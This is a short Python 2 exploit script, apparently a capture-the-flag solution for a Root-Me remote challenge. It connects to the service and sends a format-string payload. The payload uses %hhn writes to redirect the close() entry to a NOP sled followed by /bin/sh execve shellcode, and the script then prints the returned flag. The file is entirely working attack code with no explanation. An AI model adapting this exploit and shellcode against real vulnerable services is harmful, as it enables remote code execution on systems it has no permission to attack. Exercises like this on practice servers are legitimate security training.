import struct
import socket

HOST = 'challenge02.root-me.org'
PORT = 56032

BUFFER_LEN = 1024
OFFSET = 9
CLOSE_PLT = 0x804a048
SHELLCODE_ADDRESS = 0xbffff41c
SHELLCODE = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

print '[!] Shellcode\'s length: {0}.'.format(len(SHELLCODE))
print '[+] Starting communicating with the service.'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

print '[+] Preparing the exploit buffer with the shellcode.'
bytes = [0x00, 0x00, 0x00, 0x00]
bytes[0] = ((SHELLCODE_ADDRESS >> 0) & 0xff) - (len(bytes) * 4)
bytes[1] = ((SHELLCODE_ADDRESS >> 8) & 0xff) - (bytes[0] + len(bytes) * 4)
bytes[2] = ((SHELLCODE_ADDRESS >> 16) & 0xff) - (bytes[0] + bytes[1]  + len(bytes) * 4)
bytes[3] = ((SHELLCODE_ADDRESS >> 24) & 0xff) + 1

exploit = ''
exploit += struct.pack('I', CLOSE_PLT)
exploit += struct.pack('I', CLOSE_PLT + 1)
exploit += struct.pack('I', CLOSE_PLT + 2)
exploit += struct.pack('I', CLOSE_PLT + 3)

exploit += '%{0}x%{1}$hhn'.format(bytes[0], OFFSET)
exploit += '%{0}x%{1}$hhn'.format(bytes[1], OFFSET + 1)
exploit += '%{0}x%{1}$hhn'.format(bytes[2], OFFSET + 2)
exploit += '%{0}x%{1}$hhn'.format(bytes[3], OFFSET + 3)

exploit += '\x90' * (BUFFER_LEN - len(exploit) - len(SHELLCODE))
exploit += SHELLCODE

s.send(exploit)
print '[+] The buffer sent to the remote service.'
print '[+] Flag: {0}'.format(s.recv(1024))

s.close()
